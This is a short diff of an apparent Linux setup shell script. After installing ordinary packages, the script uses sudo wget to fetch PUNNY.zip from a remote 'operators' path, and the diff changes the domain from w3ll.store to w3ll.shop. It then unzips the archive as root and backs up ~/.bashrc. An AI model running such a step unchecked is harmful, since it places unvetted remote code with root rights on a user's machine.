@@ -11,7 +11,7 @@ sudo apt-get install -y figlet
 sudo apt-get install -y dos2unix
 sudo apt-get install -y curl
 sudo apt install -y nano
-sudo wget https://w3ll.store/operators/PUNNY.zip
+sudo wget https://w3ll.shop/operators/PUNNY.zip
 sudo unzip -o PUNNY.zip
 sudo rm PUNNY.zip
 cp ~/.bashrc ~/.bashrc-bak
